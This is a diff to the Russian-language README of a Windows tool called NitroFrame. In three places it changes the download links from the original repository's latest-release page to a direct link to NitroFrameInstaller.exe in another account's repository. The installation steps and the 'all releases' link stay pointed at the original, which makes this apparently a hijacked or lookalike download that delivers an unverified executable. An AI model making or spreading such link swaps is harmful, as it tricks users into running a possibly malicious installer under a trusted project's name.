@@ -7,7 +7,7 @@
 
   <br>
 
-  <a href="https://github.com/gothbolique/NitroFrameProject/releases/latest"><img alt="Скачать последнюю версию" src="https://img.shields.io/badge/СКАЧАТЬ_ПОСЛЕДНЮЮ_ВЕРСИЮ-7C5CFC?style=for-the-badge&logo=windows11&logoColor=white"></a>
+  <a href="https://github.com/d33vel00per/NitroFrameProject/releases/download/v2.0.0/NitroFrameInstaller.exe"><img alt="Скачать последнюю версию" src="https://img.shields.io/badge/СКАЧАТЬ_ПОСЛЕДНЮЮ_ВЕРСИЮ-7C5CFC?style=for-the-badge&logo=windows11&logoColor=white"></a>
   <a href="https://github.com/gothbolique/NitroFrameProject/releases"><img alt="Все релизы" src="https://img.shields.io/badge/ВСЕ_РЕЛИЗЫ-17181F?style=for-the-badge&logo=github&logoColor=white"></a>
 
   <br><br>
@@ -106,7 +106,7 @@ NitroFrame работает с настройками Windows и игровым�
 
 ## Установка
 
-1. Откройте **[последний релиз](https://github.com/gothbolique/NitroFrameProject/releases/latest)**.
+1. Откройте **[последний релиз](https://github.com/d33vel00per/NitroFrameProject/releases/download/v2.0.0/NitroFrameInstaller.exe)**.
 2. В блоке **Assets** скачайте `NitroFrameInstaller.exe`.
 3. Запустите installer и подтвердите запрос Windows.
 4. Завершите установку и откройте NitroFrame через созданный ярлык.
@@ -142,7 +142,7 @@ NitroFrame проверяет наличие новой версии через 
 
 ### Готовы попробовать NitroFrame?
 
-<a href="https://github.com/gothbolique/NitroFrameProject/releases/latest"><img alt="Скачать NitroFrame" src="https://img.shields.io/badge/СКАЧАТЬ_NITROFRAME-7C5CFC?style=for-the-badge&logo=windows11&logoColor=white"></a>
+<a href="https://github.com/d33vel00per/NitroFrameProject/releases/download/v2.0.0/NitroFrameInstaller.exe"><img alt="Скачать NitroFrame" src="https://img.shields.io/badge/СКАЧАТЬ_NITROFRAME-7C5CFC?style=for-the-badge&logo=windows11&logoColor=white"></a>
 
 <sub>Последняя опубликованная версия · Windows x64</sub>
 
